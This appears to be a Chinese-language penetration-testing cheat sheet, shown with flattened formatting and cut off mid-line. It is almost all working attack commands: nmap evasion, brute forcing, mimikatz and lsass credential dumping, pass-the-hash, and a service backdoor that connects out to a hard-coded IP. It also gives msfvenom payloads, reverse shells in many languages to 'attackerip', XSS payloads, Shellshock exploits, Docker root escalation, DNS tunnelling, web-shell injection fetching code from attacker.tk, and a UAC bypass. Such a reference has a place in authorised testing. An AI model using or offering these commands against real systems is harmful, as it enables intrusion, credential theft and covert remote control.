LiveHosts.txt 扫描系统1nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt 系统和服务检测1nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt Nmap躲避防火墙12345678910111213141516#分段$nmap -f#修改默认MTU大小，但必须为8的倍数(8,16,24,32等等)$nmap --mtu 24#生成随机数量的欺骗$nmap -D RND:10 [target]#手动指定欺骗使用的IP$nmap -D decoy1,decoy2,decoy3 etc#僵尸网络扫描，首先需要找到僵尸网络的IP$nmap -sI [Zombie IP] [Target IP]#指定源端口号$nmap --source-port 80 IP#在每个扫描数据包后追加随机数量的数据$nmap --data-length 25 IP#MAC地址欺骗，可以生成不同主机的MAC地址$nmap --spoof-mac Dell/Apple/3Com IP Nmap进行Web漏洞扫描12345678$cd /usr/share/nmap/scripts/$wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz$nmap -sS -sV --script=vulscan/vulscan.nse target$nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target$nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target$nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target$nmap -sV --script=vuln target$nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target 使用DIRB爆破目录1dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt Patator全能暴力破解测试工具1234567# git clone https://github.com/lanjelot/patator.git /usr/share/patator# SMTP 爆破$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name' 使用Fierce爆破DNS注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等123# http://ha.ckers.org/fierce/$ ./fierce.pl -dns example.com$ ./fierce.pl –dns example.com –wordlist myWordList.txt 使用Nikto扫描web服务1nikto -C all -h http://IP 扫描workpress12git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan./wpscan –url http://IP/ –enumerate p HTTP指纹识别123wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zipcd httprint_301/linux/./httprint -h http://IP -s signatures.txt 使用Skipfish扫描注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。1skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP 使用NC扫描12nc -v -w 1 target -z 1-1000for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done UnicornscanUnicornscan 是一个信息收集和安全审计的工具。123456us -H -msf -Iv 192.168.56.101 -p 1-65535us -H -mU -Iv 192.168.56.101 -p 1-65535-H 在生成报告阶段解析主机名-m 扫描类型 (sf - tcp, U - udp)-Iv - 详细 使用Xprobe2识别操作系统指纹1xprobe2 -v -p tcp:80:open IP 枚举Samba1234nmblookup -A targetsmbclient //MOUNT/share -I target -Nrpcclient -U "" targetenum4linux target 枚举SNMP123snmpget -v 1 -c public IPsnmpwalk -v 1 -c public IPsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP 实用windows cmd 命令1234567891011net localgroup Usersnet localgroup Administratorssearch dir/s *.docsystem("start cmd.exe /k $cmd")sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"Procdump.exe -accepteula -ma lsass.exe lsass.dmpmimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统 PuTTY连接隧道12转发远程端口到目标地址plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP Meterpreter端口转发1234# https://www.offensive-security.com/metasploit-unleashed/portfwd/# 转发远程端口到目标地址meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141kali &gt; rdesktop 127.0.0.1:3389 开启RDP服务123reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0netsh firewall set service remoteadmin enablenetsh firewall set service remotedesktop enable 关闭windows防火墙1netsh firewall set opmode disable Meterpreter VNC/RDP123# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/run getgui -u admin -p 1234run vnc -p 5043 使用Mimikatz获取 Windows 明文用户名密码123git clone https://github.com/gentilkiwi/mimikatz.gitprivilege::debugsekurlsa::logonPasswords full 获取哈希值1234567891011121314151617git clone https://github.com/byt3bl33d3r/pth-toolkitpth-winexe -U hash //IP cmd或者apt-get install freerdp-x11xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP在或者meterpreter &gt; run post/windows/gather/hashdumpAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586cmsf exploit(psexec) &gt; exploitmeterpreter &gt; shell 使用Hashcat破解密码1hashcat -m 400 -a 0 hash /root/rockyou.txt 使用NC在windows上反弹shell12345678c:&gt;nc -Lp 31337 -vv -e cmd.exenc 192.168.0.10 31337c:&gt;nc example.com 80 -e cmd.exenc -lp 80nc -lp 31337 -e /bin/bashnc 192.168.0.10 31337nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000 查找SUID\SGID root文件1234567891011121314151617# 查找 SUID root 文件find / -user root -perm -4000 -print# 查找 SGID root 文件:find / -group root -perm -2000 -print# 查找 SUID 和 SGID 文件:find / -perm -4000 -o -perm -2000 -print# 查找不属于任何用户的文件:find / -nouser -print# 查找不属于任何用户组的文件:find / -nogroup -print# 查找软连接及其指向:find / -type l -ls python shell1python -c 'import pty;pty.spawn("/bin/bash")' python\Ruby\PHP HTTP服务器12345python2 -m SimpleHTTPServerpython3 -m http.serverruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888, :D ocumentRoot =&gt; Dir.pwd).start"php -S 0.0.0.0:8888 获取进程对应的PID12fuser -nv tcp 80fuser -k -n tcp 80 使用hydra爆破RDP1hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp 挂载远程windows共享文件夹1smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw kali下编译exploit12gcc -m32 -o output32 hello.c (32 位)gcc -m64 -o output hello.c (64 位) kali编译windows Exploit12345678wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/downloadwine mingw-get-setup.exeselect mingw32-basecd /root/.wine/drive_c/windowswget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zipcd /root/.wine/drive_c/MinGW/binwine gcc -o ability.exe /tmp/exploit.c -lwsock32wine ability.exe NASM命令注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。12nasm -f bin -o payload.bin payload.asmnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload SSH穿透123ssh -D 127.0.0.1:1080 -p 22 user@IPAdd socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains commands target SSH穿透从一个网络到另一个网络12345ssh -D 127.0.0.1:1080 -p 22 user1@IP1Add socks4 127.0.0.1 1080 in /etc/proxychains.confproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2Add socks4 127.0.0.1 1081 in /etc/proxychains.confproxychains commands target 使用metasploit进行穿透12345678910111213141516171819route add X.X.X.X 255.255.255.0 1use auxiliary/server/socks4arunproxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E或者# https://www.offensive-security.com/metasploit-unleashed/pivoting/meterpreter &gt; ipconfigIP Address : 10.1.13.3meterpreter &gt; run autoroute -s 10.1.13.0/24meterpreter &gt; run autoroute -p10.1.13.0 255.255.255.0 Session 1meterpreter &gt; Ctrl+Zmsf auxiliary(tcp) &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set RHOST 10.1.13.2msf exploit(psexec) &gt; exploitmeterpreter &gt; ipconfigIP Address : 10.1.13.2 基于CSV文件查询Exploit-DB1234567git clone https://github.com/offensive-security/exploit-database.gitcd exploit-database./searchsploit –u./searchsploit apache 2.2./searchsploit "Linux Kernel"cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "&lt;|&lt;=" | sort -k3 MSF Payloads1234msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exemsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.phpmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c MSF生成在linux下反弹的Meterpreter Shell1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell MSF生成反弹Shell1msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c MSF生成反弹Python Shell1msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py MSF生成反弹ASP Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp ### MSF 生成反弹 Bash Shell1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh MSF 生成反弹 PHP Shell123msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.phpadd &lt;?php at the beginningperl -i~ -0777pe's/^/&lt;?php \n/' shell.php MSF 生成反弹 Win Shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe Linux 常用安全命令1234567891011121314151617181920212223242526272829303132333435363738394041# 使用 uid 查找对应的程序find / -uid 0 -perm -4000# 查找哪里拥有写权限find / -perm -o=w# 查找名称中包含点和空格的文件find / -name " " -printfind / -name ".." -printfind / -name ". " -printfind / -name " " -print# 查找不属于任何人的文件find / -nouser# 查找未链接的文件lsof +L1# 获取进程打开端口的信息lsof -i# 看看 ARP 表中是否有奇怪的东西arp -a# 查看所有账户getent passwd# 查看所有用户组getent group# 列举所有用户的 crontabsfor user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done# 生成随机密码cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4# 查找所有不可修改的文件find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’# 使文件不可修改chattr -i file Windows 缓冲区溢出利用命令12345678910111213141516171819202122232425msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f cmsfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f cCOMMONLY USED BAD CHARACTERS:\x00\x0a\x0d\x20 For http request\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c Ending with (0\n\r_)# 常用命令:pattern createpattern offset (EIP Address)pattern offset (ESP Address)add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )!pvefindaddr pattern_create 5000!pvefindaddr suggest!pvefindaddr modules!pvefindaddr nosafeseh!mona config -set workingfolder C:\Mona\%p!mona config -get workingfolder!mona mod!mona bytearray -b "\x00\x0a"!mona pc 5000!mona po EIP!mona suggest SEH – 结构化异常处理123456# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH# http://baike.baidu.com/view/243131.htm!mona suggest!mona nosafesehnseh="\xeb\x06\x90\x90" (next seh chain)iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN) ROP注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。1234567# https://en.wikipedia.org/wiki/Return-oriented_programming# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B# https://en.wikipedia.org/wiki/Data_Execution_Prevention# http://baike.baidu.com/item/DEP/7694630!mona modules!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest) ASLR – 地址空间格局随机化123# https://en.wikipedia.org/wiki/Address_space_layout_randomization# http://baike.baidu.com/view/3862310.htm!mona noaslr 寻蛋(EGG Hunter)技术Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。12345678# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf# http://www.fuzzysecurity.com/tutorials/expDev/4.html!mona jmp -r esp!mona egg -t lxxl\xeb\xc4 (jump backward -60)buff=lxxllxxl+shell!mona egg -t 'w00t' GDB Debugger 常用命令12345678910111213141516171819202122232425262728293031323334# 设置断点break *_start# 执行下一个命令nextstepns# 继续执行continuec# 数据checking 'REGISTERS' and 'MEMORY'# 显示寄存器的值: (Decimal,Binary,Hex)print /d –&gt; Decimalprint /t –&gt; Binaryprint /x –&gt; HexO/P :(gdb) print /d $eax$17 = 13(gdb) print /t $eax$18 = 1101(gdb) print /x $eax$19 = 0xd(gdb)# 显示特定内存地址的值command : x/nyz (Examine)n –&gt; Number of fields to display ==&gt;y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal)z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit) BASH反弹Shell1234567891011121314151617bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1exec /bin/bash 0&amp;0 2&gt;&amp;0exec /bin/bash 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;1960&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; doneexec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1 PERL 反弹 Shell12345perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'# Win 平台perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;’ RUBY 反弹 Shell12345ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'# Win 平台ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)' PYTHON 反弹 Shell1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' PHP 反弹 Shell1php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' JAVA 反弹 Shell123r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])p.waitFor() NETCAT 反弹 Shell12345678910nc -e /bin/sh attackerip 4444nc -e /bin/sh 192.168.37.10 443# 如果 -e 参数被禁用，可以尝试以下命令# mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 443rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/# 如果你安装错了 netcat 的版本，请尝试以下命令rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f TELNET 反弹 Shell12# 如果 netcat 不可用或者 /dev/tcpmknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe XTERM 反弹 Shell12345678910111213141516# http://baike.baidu.com/view/418628.htm# 开启 X 服务器 (:1 – 监听 TCP 端口 6001)apt-get install xnestXnest :1# 记得授权来自目标 IP 的连接xterm -display 127.0.0.1:1# 授权访问xhost +targetip# 在目标机器上连接回我们的 X 服务器xterm -display attackerip:1/usr/openwin/bin/xterm -display attackerip:1or$ DISPLAY=attackerip:0 xterm XSS备忘录123456789101112131415161718192021222324252627282930https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet("&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;")&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;";!–"&lt;XSS&gt;=&amp;amp;amp;&#123;()&#125;&lt;IMG SRC="javascript:alert('XSS');"&gt;&lt;IMG SRC=javascript:alert('XSS')&gt;&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;""&gt;&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;&lt;IMG SRC="jav ascript:alert('XSS');"&gt;perl -e 'print "&lt;IMG SRC=javascript:alert(\"XSS\")&gt;";' &gt; out&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;("&gt;&lt; iframes http://google.com &lt; iframes &gt;)&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;"&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;%253cscript%253ealert(document.cookie)%253c/script%253e"&gt;&lt;s"%2b"cript&gt;alert(document.cookie)&lt;/script&gt;%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)'%3E&lt;img src=asdf onerror=alert(document.cookie)&gt; SSH Over SCTP (使用 Socat)1234567891011# 远端服务器# 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP$ socat SCTP-LISTEN:80,fork TCP:localhost:22# 本地端# 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80# 创建 socks 代理# 替换 username 和 -p 的端口号$ ssh -lusername localhost -D 8080 -p 1337 使用洋葱网络12345678910111213141516171819# 安装服务$ apt-get install tor torsocks# 绑定 ssh 到 tor 服务端口 80# /etc/tor/torrcSocksPolicy accept 127.0.0.1SocksPolicy accept 192.168.0.0/16Log notice file /var/log/tor/notices.logRunAsDaemon 1HiddenServiceDir /var/lib/tor/ssh_hidden_service/HiddenServicePort 80 127.0.0.1:22PublishServerDescriptor 0$ /etc/init.d/tor start$ cat /var/lib/tor/ssh_hidden_service/hostname3l5zstvt1zk5jhl662.onion# ssh 客户端连接$ apt-get install torsocks$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80 Metagoofil – 元数据收集工具注：Metagoofil 是一款利用Google收集信息的工具。123# http://www.edge-security.com/metagoofil.php# 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html 利用 Shellshock12345678910111213# 一个发现并利用服务器 Shellshock 的工具# https://github.com/nccgroup/shocker$ ./shocker.py -H 192.168.56.118 --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose# 查看文件$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80# 绑定 shell$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80# 反弹 Shell$ nc -l -p 443$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80 获取 Docker 的 Root12345678910111213141516171819202122232425262728# 获取 Docker 的 Root# user 必须在 docker 用户组中ek@victum:~/docker-test$ iduid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)ek@victum:~$ mkdir docker-testek@victum:~$ cd docker-testek@victum:~$ cat &gt; DockerfileFROM debian:wheezyENV WORKDIR /stuffRUN mkdir -p $WORKDIRVOLUME [ $WORKDIR ]WORKDIR $WORKDIR&lt;&lt; EOFek@victum:~$ docker build -t my-docker-image .ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \'cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh'./shwhoami# rootek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow' 使用 DNS 隧道绕过防火墙123456789101112131415161718# 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查# dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序# 服务器 (攻击者)$ apt-get update$ apt-get -y install ruby-dev git make g++$ gem install bundler$ git clone https://github.com/iagox86/dnscat2.git$ cd dnscat2/server$ bundle install$ ruby ./dnscat2.rbdnscat2&gt; New session established: 16059dnscat2&gt; session -i 16059# 客户机 (目标)# https://downloads.skullsecurity.org/dnscat2/# https://github.com/lukebaggett/dnscat2-powershell$ dnscat --host &lt;dnscat server_ip&gt; 编译 Assemble 代码12345$ nasm -f elf32 simple32.asm -o simple32.o$ ld -m elf_i386 simple32.o simple32$ nasm -f elf64 simple.asm -o simple.o$ ld simple.o -o simple 使用非交互 Shell 打入内网1234567891011121314# 生成 shell 使用的 ssh 密钥$ wget -O - -q "http://domain.tk/sh.php?cmd=whoami"$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"# 增加用户 tempuser $ useradd -m tempuser$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh$ wget -O - -q "http://domain.tk/sh.php?cmd=cat /tmp/id_rsa" &gt; /home/tempuser/.ssh/authorized_keys$ chmod 700 /home/tempuser/.ssh/authorized_keys$ chown -R tempuser:tempuser /home/tempuser/.ssh# 反弹 ssh shell$ wget -O - -q "http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;" 利用 POST 远程命令执行获取 Shell123456789101112attacker:~$ curl -i -s -k -X 'POST' --data-binary $'IP=%3Bwhoami&amp;submit=submit' 'http://victum.tk/command.php'attacker:~$ curl -i -s -k -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit' 'http://victum.tk/command.php'attacker:~$ curl http://victum.tk/shell.php?cmd=id# 在服务器上下载 shell (phpshell.php)http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27# 运行 nc 并执行 phpshell.phpattacker:~$ nc -nvlp 1337 以管理员身份在 Win7 上反弹具有系统权限的 Shell12345678910111213141516171819202122232425262728293031323334353637383940414243msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe# 显示账户配置net user &lt;login&gt;# Kali 上下载 psexechttps://technet.microsoft.com/en-us/sysinternals/bb897553.aspx# 使用 powershell 脚本上传 psexec.exe 到目标机器echo $client = New-Object System.Net.WebClient &gt; script.ps1echo $targetlocation = "http://192.168.56.102/PsExec.exe" &gt;&gt; script.ps1echo $client.DownloadFile($targetlocation,"psexec.exe") &gt;&gt; script.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1# 使用 powershell 脚本上传 danger.exe 到目标机器echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = "http://192.168.56.102/danger.exe" &gt;&gt; script2.ps1echo $client.DownloadFile($targetlocation,"danger.exe") &gt;&gt; script2.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1# 使用预编译的二进制文件绕过 UAC:https://github.com/hfiref0x/UACME# 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器echo $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = "http://192.168.56.102/Akagi64.exe" &gt;&gt; script3.ps1echo $client.DownloadFile($targetlocation,"Akagi64.exe") &gt;&gt; script3.ps1powershell.exe 